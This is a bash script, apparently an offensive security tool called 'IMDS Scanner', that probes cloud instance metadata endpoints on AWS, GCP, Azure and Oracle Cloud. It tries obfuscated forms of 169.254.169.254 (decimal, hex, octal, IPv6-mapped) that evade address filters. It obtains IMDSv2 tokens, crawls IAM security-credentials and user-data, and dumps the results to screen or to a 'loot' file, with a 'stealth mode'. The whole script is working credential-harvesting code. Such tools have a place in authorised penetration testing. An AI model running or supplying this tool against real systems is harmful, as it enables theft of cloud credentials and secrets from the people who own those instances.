#!/bin/bash

# ==============================================================================
# IMDS Scanner v5.2 (Mortimus Edition)
# Author: Mortimus
# Repo: https://github.com/Mortimus/IMDSScanner
# Purpose: Deeply enumerate cloud metadata (AWS, GCP, Azure, OCI).
#          - Auto-detects provider via External Check (DEFAULT ON).
#          - Recursively crawls AWS IMDS.
#          - Dumps full JSON for GCP/Azure.
#          - Validates AWS IMDSv2 Tokens.
#          - Supports logging to flatfile.
# Usage: ./cloud_meta_enum.sh [-i interface] [-s] [-d] [-o file] [-h]
# Dependencies: curl
# ==============================================================================

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Global Configuration
INTERFACE=""
CURL_OPTS=()
EXTERNAL_CHECK=true  # DEFAULT: ON
DEBUG=false
DETECTED_PROVIDER="" # Will be set to "AWS", "GCP", "AZURE", or "OCI" if detected
OUTPUT_FILE=""

# Target definitions (Standard and Obfuscated)
TARGETS=(
    "http://169.254.169.254"                  # Standard Dotted Decimal
    "http://2852039166"                       # Decimal (DWORD)
    "http://0xA9FEA9FE"                       # Hexadecimal
    "http://0xA9.0xFE.0xA9.0xFE"              # Dotted Hex
    "http://0251.0376.0251.0376"              # Dotted Octal
    "http://025177524776"                     # Octal
    "http://[::ffff:a9fe:a9fe]"               # IPv6 Mapped IPv4
)

# Helper function for debug output
debug_log() {
    if [ "$DEBUG" = true ]; then
        echo -e "${YELLOW}[DEBUG] $1${NC}"
    fi
}

# Usage Function
usage() {
    echo -e "${GREEN}IMDS Scanner (Mortimus Edition)${NC}"
    echo -e "Usage: ./cloud_meta_enum.sh [OPTIONS]"
    echo -e ""
    echo -e "Options:"
    echo -e "  -i <iface>  Force usage of a specific network interface (e.g., eth0, ens5)."
    echo -e "  -s          SKIP external IP/Provider check (Stealth Mode)."
    echo -e "  -o <file>   Save output to flatfile (append mode)."
    echo -e "  -d          Enable DEBUG mode for verbose output."
    echo -e "  -h          Show this help message."
    echo -e ""
    echo -e "Examples:"
    echo -e "  ./cloud_meta_enum.sh             # Run standard scan"
    echo -e "  ./cloud_meta_enum.sh -o loot.txt # Save results to file"
    echo -e "  ./cloud_meta_enum.sh -s          # Internal only (No external traffic)"
}

# ==============================================================================
# AWS SPIDER LOGIC
# ==============================================================================
aws_recurse() {
    local base_url=$1
    local current_path=$2
    local header_args=("${@:3}") # Pass header array (Token)

    # Get listing
    debug_log "Crawling: ${base_url}/${current_path}"
    local content=$(curl -s -L "${CURL_OPTS[@]}" "${header_args[@]}" --max-time 1 "${base_url}/${current_path}")

    # Check for empty response or common error pages
    if [[ -z "$content" || "$content" == *"404"* || "$content" == *"<html>"* ]]; then
        return
    fi

    # Read line by line
    while IFS= read -r line; do
        # Clean up line (remove \r)
        line=$(echo "$line" | tr -d '\r')
        
        # If line ends in '/', it's a directory -> Recurse
        if [[ "$line" == */ ]]; then
             echo -e "${MAGENTA}   [DIR] /${current_path}${line}${NC}"
             aws_recurse "$base_url" "${current_path}${line}" "${header_args[@]}"
        else
             # It's a file -> Fetch content
             local file_val=$(curl -s -L "${CURL_OPTS[@]}" "${header_args[@]}" --max-time 1 "${base_url}/${current_path}${line}")
             
             # Filter out "No such metadata item" (Common OCI/AWS error text)
             if [[ "$file_val" == *"No such metadata item"* ]]; then
                 echo -e "${YELLOW}      > ${current_path}${line}:${NC} (Not Found/Invalid)"
                 continue
             fi

             # Filter out HTML/XML 404s (The "Jim" Fix)
             if [[ "$file_val" == *"<html>"* || "$file_val" == *"<?xml"* || "$file_val" == *"404 - Not Found"* ]]; then
                 echo -e "${YELLOW}      > ${current_path}${line}:${NC} (404/HTML Response Suppressed)"
                 continue
             fi

             echo -e "${GREEN}      > ${current_path}${line}:${NC} ${file_val}"
             
             # Check for sensitive keywords
             if [[ "$line" == "user-data" ]]; then
                 echo -e "${RED}        [!] USER-DATA FOUND. POTENTIAL SECRETS/SCRIPTS.${NC}"
             fi
             if [[ "$current_path" == *"security-credentials"* ]]; then
                 echo -e "${RED}        [!] CREDENTIALS EXFILTRATED.${NC}"
             fi
        fi
    done <<< "$content"
}

enum_aws() {
    local base_url=$1
    
    if [[ -n "$DETECTED_PROVIDER" && "$DETECTED_PROVIDER" != "AWS" ]]; then
        debug_log "Skipping AWS check (Target is $DETECTED_PROVIDER)"
        return
    fi

    echo -e "${YELLOW}    [>] Probing AWS Compatibility...${NC}"
    
    # 1. IMDSv2 Token Acquisition with STRICT VALIDATION
    debug_log "Requesting IMDSv2 Token..."
    token=$(curl -s -X PUT "${CURL_OPTS[@]}" "${base_url}/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 2)
    
    HEADER_ARGS=()
    
    # Validation: Must not be HTML, must not be empty, must not look like an error
    if [[ -n "$token" && "$token" != *"<html>"* && "$token" != *"403"* && "$token" != *"404"* && "$token" != *"405"* ]]; then
        echo -e "${GREEN}    [+] AWS IMDSv2 Token Acquired!${NC}"
        echo -e "${GREEN}    [+] Token: $token${NC}"
        HEADER_ARGS=(-H "X-aws-ec2-metadata-token: $token")
        DETECTED_PROVIDER="AWS"
    else
        debug_log "IMDSv2 Token Rejected (Response was empty, HTML, or Error)."
        if [[ "$token" == *"<html>"* ]]; then debug_log "Raw Response: HTML Detected (likely 404/405/403 page)"; fi
        
        echo -e "${YELLOW}    [!] IMDSv2 Token not available. Falling back to IMDSv1/Compat check.${NC}"
        
        # Check simple connectivity to verify it's AWS IMDSv1
        check_v1=$(curl -s -L "${CURL_OPTS[@]}" --max-time 1 "${base_url}/latest/meta-data/instance-id")
        
        # Verify response isn't "No such metadata item" (Oracle returns this for AWS paths sometimes)
        if [[ -n "$check_v1" && "$check_v1" != *"404"* && "$check_v1" != *"<html>"* && "$check_v1" != *"No such metadata"* ]]; then
             echo -e "${GREEN}    [+] AWS IMDSv1 Detected (Instance ID: $check_v1)${NC}"
             DETECTED_PROVIDER="AWS"
        else
             debug_log "AWS IMDSv1 Probe failed or returned invalid data."
             return
        fi
    fi

    echo -e "${BLUE}    [*] Starting Recursive Crawl...${NC}"
    
    echo -e "${MAGENTA}   [DIR] /latest/user-data${NC}"
    user_data=$(curl -s -L "${CURL_OPTS[@]}" "${HEADER_ARGS[@]}" --max-time 2 "${base_url}/latest/user-data")
    if [[ -n "$user_data" && "$user_data" != *"404"* && "$user_data" != *"<html>"* ]]; then
         echo -e "${GREEN}      > user-data:${NC} $user_data"
    else
         echo -e "${YELLOW}      > user-data: (Empty/None)${NC}"
    fi

    # Recurse meta-data
    aws_recurse "$base_url" "latest/meta-data/" "${HEADER_ARGS[@]}"
}

# ==============================================================================
# GCP RECURSIVE DUMP
# ==============================================================================
enum_gcp() {
    local base_url=$1

    if [[ -n "$DETECTED_PROVIDER" && "$DETECTED_PROVIDER" != "GCP" ]]; then return; fi

    echo -e "${YELLOW}    [>] Probing GCP...${NC}"
    local header="Metadata-Flavor: Google"

    output=$(curl -s -L "${CURL_OPTS[@]}" -H "$header" --max-time 2 "${base_url}/computeMetadata/v1/project/?recursive=true")
    
    if [[ -n "$output" && "$output" != *"404"* && "$output" != *"403"* ]]; then
         DETECTED_PROVIDER="GCP"
         echo -e "${GREEN}    [+] GCP DETECTED! Dumping Project Metadata (JSON):${NC}"
         echo "$output"
         echo -e "${GREEN}    [+] Dumping Instance Metadata (JSON):${NC}"
         inst_output=$(curl -s -L "${CURL_OPTS[@]}" -H "$header" --max-time 2 "${base_url}/computeMetadata/v1/instance/?recursive=true")
         echo "$inst_output"
    else
         debug_log "GCP Probe failed."
    fi
}

# ==============================================================================
# AZURE FULL DUMP
# ==============================================================================
enum_azure() {
    local base_url=$1

    if [[ -n "$DETECTED_PROVIDER" && "$DETECTED_PROVIDER" != "AZURE" ]]; then return; fi

    echo -e "${YELLOW}    [>] Probing Azure...${NC}"
    local header="Metadata: true"
    
    output=$(curl -s -L "${CURL_OPTS[@]}" -H "$header" --max-time 2 "${base_url}/metadata/instance?api-version=2021-02-01")

    if [[ -n "$output" && "$output" != *"404"* && "$output" != *"400"* ]]; then
         DETECTED_PROVIDER="AZURE"
         echo -e "${GREEN}    [+] AZURE DETECTED! Dumping Full Configuration:${NC}"
         echo "$output"
         echo -e "${BLUE}    [*] Checking for Attested Data...${NC}"
         attested=$(curl -s -L "${CURL_OPTS[@]}" -H "$header" --max-time 2 "${base_url}/metadata/attested/document?api-version=2021-02-01")
         echo "$attested"
    else
         debug_log "Azure Probe failed."
    fi
}

# ==============================================================================
# ORACLE CLOUD (OCI) ENUMERATION
# ==============================================================================
enum_oci() {
    local base_url=$1

    if [[ -n "$DETECTED_PROVIDER" && "$DETECTED_PROVIDER" != "OCI" ]]; then return; fi

    echo -e "${YELLOW}    [>] Probing Oracle Cloud (OCI)...${NC}"
    local header="Authorization: Bearer Oracle" # Only for v2, v1 is open

    # Try OCI v1 Instance Metadata
    output=$(curl -s -L "${CURL_OPTS[@]}" --max-time 2 "${base_url}/opc/v1/instance/")
    
    if [[ -n "$output" && "$output" != *"404"* && "$output" != *"<html>"* ]]; then
         DETECTED_PROVIDER="OCI"
         echo -e "${GREEN}    [+] OCI DETECTED! Dumping Instance Metadata:${NC}"
         echo "$output" | sed 's/^/      /'
    else
         debug_log "OCI Probe failed."
    fi
}


# ==============================================================================
# ORCHESTRATION
# ==============================================================================

check_metadata() {
    local url=$1
    if [[ -n "$DETECTED_PROVIDER" ]]; then :; fi # No-op if provider locked

    echo -e "${BLUE}[*] Probe: ${url}${NC}"
    response_code=$(curl -s -L "${CURL_OPTS[@]}" --max-time 2 --connect-timeout 2 -w "%{http_code}" -o /dev/null "$url")

    if [[ "$response_code" != "000" ]]; then
        echo -e "${GREEN}[+] Host is UP. Starting provider checks...${NC}"
        
        # Priority checks based on External detection if available
        if [[ "$DETECTED_PROVIDER" == "OCI" ]]; then
            enum_oci "$url"
            enum_aws "$url" # OCI has AWS compat
        else
            enum_aws "$url"
            enum_gcp "$url"
            enum_azure "$url"
            enum_oci "$url"
        fi
        echo ""
    else
        debug_log "Host unreachable."
    fi
}

check_external_provider() {
    echo -e "${BLUE}[*] Initiating External IP & Provider Lookup...${NC}"
    if [[ -n "$INTERFACE" ]]; then
        echo -e "${BLUE}[*] Using Interface: ${INTERFACE}${NC}"
    fi
    
    public_ip=$(curl -s -L "${CURL_OPTS[@]}" --max-time 5 "https://ifconfig.me/ip")
    
    if [[ -z "$public_ip" ]]; then
        echo -e "${RED}[-] Failed to retrieve Public IP.${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Public IP identified: ${public_ip}${NC}"
    echo -e "${YELLOW}    [>] Querying ASN/ISP database...${NC}"
    provider_json=$(curl -s -L "${CURL_OPTS[@]}" --max-time 5 "http://ip-api.com/json/${public_ip}")
    debug_log "Provider JSON: $provider_json"
    
    if [[ -n "$provider_json" ]]; then
        org=$(echo "$provider_json" | grep -oP '(?<="org":")[^"]*' 2>/dev/null)
        isp=$(echo "$provider_json" | grep -oP '(?<="isp":")[^"]*' 2>/dev/null)
        
        if [[ -z "$org" ]]; then org=$(echo "$provider_json" | sed -n 's/.*"org":"\([^"]*\)".*/\1/p'); fi
        if [[ -z "$isp" ]]; then isp=$(echo "$provider_json" | sed -n 's/.*"isp":"\([^"]*\)".*/\1/p'); fi

        echo -e "      > ISP: ${GREEN}${isp}${NC}"
        echo -e "      > Org: ${GREEN}${org}${NC}"
        
        # Heuristics
        if [[ "${org,,}" == *"amazon"* || "${isp,,}" == *"amazon"* ]]; then
            echo -e "      > Detection: ${BLUE}AWS Environment${NC}"
            DETECTED_PROVIDER="AWS"
        elif [[ "${org,,}" == *"google"* || "${isp,,}" == *"google"* ]]; then
            echo -e "      > Detection: ${BLUE}Google Cloud (GCP)${NC}"
            DETECTED_PROVIDER="GCP"
        elif [[ "${org,,}" == *"microsoft"* || "${isp,,}" == *"azure"* ]]; then
            echo -e "      > Detection: ${BLUE}Azure / Microsoft Cloud${NC}"
            DETECTED_PROVIDER="AZURE"
        elif [[ "${org,,}" == *"oracle"* || "${isp,,}" == *"oracle"* ]]; then
            echo -e "      > Detection: ${BLUE}Oracle Cloud (OCI)${NC}"
            DETECTED_PROVIDER="OCI"
        else
            echo -e "      > Detection: Unknown / Hosting Provider"
        fi
        
        if [[ -n "$DETECTED_PROVIDER" ]]; then
            echo -e "${YELLOW}[!] Provider Locked: $DETECTED_PROVIDER. Skipping checks for other clouds.${NC}"
        fi
    else
        echo -e "${RED}[-] Failed to query provider info.${NC}"
    fi
    echo ""
}

# Argument Parsing
while getopts "i:sdho:" opt; do
  case $opt in
    i)
      INTERFACE="$OPTARG"
      CURL_OPTS+=(--interface "$INTERFACE")
      ;;
    s)
      EXTERNAL_CHECK=false
      ;;
    d)
      DEBUG=true
      ;;
    o)
      OUTPUT_FILE="$OPTARG"
      ;;
    h)
      usage
      exit 0
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      usage
      exit 1
      ;;
  esac
done

# Initialize Output Logging if requested
if [[ -n "$OUTPUT_FILE" ]]; then
    touch "$OUTPUT_FILE"
    # Redirect stdout (1) and stderr (2) to a process substitution that pipes to 'tee'
    # This allows output to be seen on screen AND saved to file simultaneously.
    exec > >(tee -a "$OUTPUT_FILE") 2>&1
    echo -e "${BLUE}[*] Logging started. Output saved to: $OUTPUT_FILE${NC}"
fi

# Main Execution
echo -e "${GREEN} ___ __  __ ____  ____  ${NC}"
echo -e "${GREEN}|_ _|  \/  |  _ \/ ___| ${NC}"
echo -e "${GREEN} | || |\/| | | | \___ \ ${NC}"
echo -e "${GREEN} | || |  | | |_| |___) |${NC}"
echo -e "${GREEN}|___|_|  |_|____/|____/ ${NC}"
echo -e "                                             "
echo -e "IMDS Scanner v5.2 (Mortimus Edition)"
echo -e "Targeting Link-Local: 169.254.169.254"

if [[ -n "$INTERFACE" ]]; then
    echo -e "${YELLOW}[!] FORCING INTERFACE: $INTERFACE ${NC}"
fi

if [[ "$EXTERNAL_CHECK" == "false" ]]; then
    echo -e "${YELLOW}[!] STEALTH MODE: External check DISABLED.${NC}"
fi

if [[ "$DEBUG" == "true" ]]; then
    echo -e "${YELLOW}[!] DEBUG MODE ENABLED${NC}"
fi

echo -e "------------------------------------------------------"

# Check for curl
if ! command -v curl &> /dev/null; then
    echo -e "${RED}[X] Error: curl is not installed.${NC}"
    exit 1
fi

if [ "$EXTERNAL_CHECK" = true ]; then
    check_external_provider
fi

if [[ -n "$DETECTED_PROVIDER" ]]; then
    check_metadata "http://169.254.169.254"
else
    for target in "${TARGETS[@]}"; do
        check_metadata "$target"
        if [[ -n "$DETECTED_PROVIDER" ]]; then
            break 
        fi
    done
fi

echo -e "------------------------------------------------------"
echo -e "${BLUE}[*] Scan complete. Hack the Planet.${NC}"
